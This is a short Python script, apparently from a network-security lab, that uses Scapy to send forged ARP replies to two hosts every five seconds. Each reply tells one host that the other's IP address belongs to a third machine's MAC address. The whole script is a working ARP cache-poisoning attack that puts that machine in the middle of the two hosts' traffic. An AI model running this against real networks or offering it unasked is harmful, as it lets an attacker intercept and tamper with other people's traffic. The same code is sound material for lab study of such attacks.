from scapy.all import *
import time

# MAC and IP addresses
mac_m = "02:42:0a:09:00:69"  # MAC address of M
ip_b = "10.9.0.6"  # IP address of B
mac_a = "02:42:0a:09:00:05"  # MAC address of A
ip_a = "10.9.0.5"  # IP address of A
mac_b = "02:42:0a:09:00:06"  # MAC address of B

# Continuously send ARP reply packets to A and B
while True:
    # Spoof ARP reply packet for A
    arp_a = Ether(src=mac_m, dst=mac_a) / ARP(op=2, hwsrc=mac_m, psrc=ip_b, hwdst=mac_a, pdst=ip_a)
    sendp(arp_a, verbose=0)
    
    # Spoof ARP reply packet for B
    arp_b = Ether(src=mac_m, dst=mac_b) / ARP(op=2, hwsrc=mac_m, psrc=ip_a, hwdst=mac_b, pdst=ip_b)
    sendp(arp_b, verbose=0)
    
    time.sleep(5)  # Wait for 5 seconds before sending the next batch of spoofed packets

